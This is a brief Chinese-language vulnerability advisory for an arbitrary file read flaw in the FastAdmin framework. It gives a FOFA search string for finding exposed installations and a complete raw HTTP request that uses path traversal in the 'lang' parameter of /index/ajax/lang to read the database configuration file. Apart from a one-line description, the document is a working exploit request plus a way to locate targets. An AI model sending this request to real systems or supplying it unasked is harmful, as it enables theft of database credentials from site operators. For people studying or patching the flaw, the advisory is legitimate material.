# FastAdmin框架存在任意文件读取漏洞

### 1.漏洞描述

FastAdmin是一个基于ThinkPHP和Bootstrap的快速开发的后台管理系统框架。FastAdmin框架存在文件读取漏洞漏洞，攻击者利用此漏洞可以获取系统敏感信息。

### 2.fofa语法

```plain
app="FastAdmin"
```

### 3.漏洞复现

```plain
GET /index/ajax/lang?lang=../../application/database HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive


```

![image-20240619225023548](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240619225023548.png)